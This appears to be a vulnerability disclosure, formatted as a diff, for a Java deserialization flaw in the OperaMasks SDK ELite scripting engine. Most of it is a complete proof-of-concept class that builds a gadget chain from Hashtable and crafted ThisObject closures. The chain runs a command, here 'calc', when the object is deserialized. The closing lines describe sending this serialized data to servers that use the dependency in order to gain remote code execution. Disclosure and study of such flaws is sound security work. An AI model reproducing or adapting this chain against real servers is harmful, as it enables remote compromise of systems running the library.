@@ -1,0 +1,251 @@
+OperaMasks SDK (Software Development Kit) is a complete set of Web application development toolkits launched by Apusic (Shanghai Fanruan). Its core is OperaMasks, a Web framework based on the JavaServer Faces (JSF) specification, as well as its native Ajax engine, Rich Components, development plug-ins and runtime libraries.
+The OperaMasks SDK ELite scripting engine contains classes that may be used to deserialize the construction of the exploit chain, resulting in command execution and gaining privileges.
+
+You can download the dependencies required for the ELite scripting engine from the following link: https://sourceforge.net/projects/aom-elite, or it is already built into the OperaMasks SDK.
+Its jar package is named elite-src.jar or elite.jar + elite-api.jar
+
+The following script is used to verify that it can be used for deserialization vulnerabilities：
+
+import elite.lang.Closure;
+import org.operamasks.el.eval.ELContextImpl;
+import org.operamasks.el.eval.EvaluationContext;
+import org.operamasks.el.eval.closure.ClassDefinition;
+import org.operamasks.el.eval.closure.ClosureObject;
+import org.operamasks.el.eval.closure.ThisObject;
+import org.operamasks.el.parser.ELNode;
+
+import javax.el.BeanELResolver;
+import javax.el.CompositeELResolver;
+import javax.el.ELContext;
+import javax.el.MethodInfo;
+import java.io.*;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class testFinal {
+    public testFinal() throws IOException {
+    }
+
+    public static void main(String[] args) throws Exception {
+        CompositeELResolver resolver = new CompositeELResolver();
+        resolver.add(new BeanELResolver());
+        ELContext ctx = new ELContextImpl(resolver);
+        java.lang.reflect.Method m = org.operamasks.el.eval.ELEngine.class.getDeclaredMethod("setCurrentELContext", javax.el.ELContext.class);
+        m.setAccessible(true);
+        m.invoke(null, ctx);
+
+        Class<?> ec = Class.forName("org.operamasks.el.eval.EvaluationContext");
+        EvaluationContext ecInstance = (EvaluationContext) ec.getDeclaredConstructor(ELContext.class).newInstance(ctx);
+
+        ClassDefinition classDefinition = new ClassDefinition(ecInstance, new ELNode.CLASSDEF(1, "", "", "", new String[]{""}, new ELNode.DEFINE[]{}, new ELNode.DEFINE[]{}));
+
+        ThisObject thisObject = new ThisObject() {
+
+            @Override
+            protected void addInterface(Class var1) {
+
+            }
+
+            @Override
+            protected Class[] getInterfaces() {
+                return new Class[0];
+            }
+
+            @Override
+            protected void setOwner(ClosureObject var1) {
+
+            }
+
+            @Override
+            protected void init(ELContext var1, Closure[] var2) {
+
+            }
+
+            @Override
+            protected Object createProxy(ELContext var1) {
+                return null;
+            }
+
+            @Override
+            public ClassDefinition get_class() {
+                return classDefinition;
+            }
+
+            @Override
+            public ClosureObject get_owner() {
+                return null;
+            }
+
+            @Override
+            public Object get_proxy() {
+                return null;
+            }
+
+            @Override
+            public Closure get_closure(ELContext var1, String var2) {
+                return null;
+            }
+
+            @Override
+            public Map<String, Closure> get_closures(ELContext var1) {
+                return null;
+            }
+
+            @Override
+            protected Closure get_my_closure(ELContext var1, String var2) {
+                return new Closure() {
+                    @Override
+                    public Object invoke(ELContext ctx, Closure[] args) {
+                        try {
+                            // This is the key point of command execution
+                            Runtime.getRuntime().exec("calc");
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                        return null;
+                    }
+
+                    @Override
+                    public int arity(ELContext var1) {
+                        return 0;
+                    }
+
+                    @Override
+                    public MethodInfo getMethodInfo(ELContext var1) {
+                        return null;
+                    }
+
+                    @Override
+                    public Object getValue(ELContext elContext) {
+                        return null;
+                    }
+
+                    @Override
+                    public void setValue(ELContext elContext, Object o) {
+
+                    }
+
+                    @Override
+                    public boolean isReadOnly(ELContext elContext) {
+                        return false;
+                    }
+
+                    @Override
+                    public Class<?> getType(ELContext elContext) {
+                        return null;
+                    }
+
+                    @Override
+                    public Class<?> getExpectedType() {
+                        return null;
+                    }
+
+                    @Override
+                    public String getExpressionString() {
+                        return null;
+                    }
+
+                    @Override
+                    public boolean equals(Object o) {
+                        return false;
+                    }
+
+                    @Override
+                    public int hashCode() {
+                        return 0;
+                    }
+
+                    @Override
+                    public boolean isLiteralText() {
+                        return false;
+                    }
+                };
+            }
+
+            @Override
+            protected Map<String, Closure> getClosureMap() {
+                return null;
+            }
+        };
+
+        Hashtable<Object, Object> hashtable = new Hashtable<>();
+        hashtable.put(thisObject, "test");
+        hashtable.put(new ThisObject() {
+            @Override
+            protected void addInterface(Class var1) {
+
+            }
+
+            @Override
+            protected Class[] getInterfaces() {
+                return new Class[0];
+            }
+
+            @Override
+            protected void setOwner(ClosureObject var1) {
+
+            }
+
+            @Override
+            protected void init(ELContext var1, Closure[] var2) {
+
+            }
+
+            @Override
+            protected Object createProxy(ELContext var1) {
+                return null;
+            }
+
+            @Override
+            public ClassDefinition get_class() {
+                return classDefinition;
+            }
+
+            @Override
+            public ClosureObject get_owner() {
+                return null;
+            }
+
+            @Override
+            public Object get_proxy() {
+                return null;
+            }
+
+            @Override
+            public Closure get_closure(ELContext var1, String var2) {
+                return null;
+            }
+
+            @Override
+            public Map<String, Closure> get_closures(ELContext var1) {
+                return null;
+            }
+
+            @Override
+            protected Closure get_my_closure(ELContext var1, String var2) {
+                return null;
+            }
+
+            @Override
+            protected Map<String, Closure> getClosureMap() {
+                return null;
+            }
+        }, "test");
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashtable);
+        oos.flush();
+        oos.close();
+
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+}
+
+
+After the script is executed, the calculator will pop up twice. The first execution is when the object is put into the hashtable for the second time. The second execution is when deserializing.
+This deserialization chain only uses classes in the Hashtable and ELite dependencies, indicating that any server that uses this dependency may be vulnerable to deserialization attacks.
+We imagine that a certain interface of a Java server can deserialize foreign data. This server has an ELite script engine dependency, so we can send the serialized data in the above script to it, thereby remotely RCE.
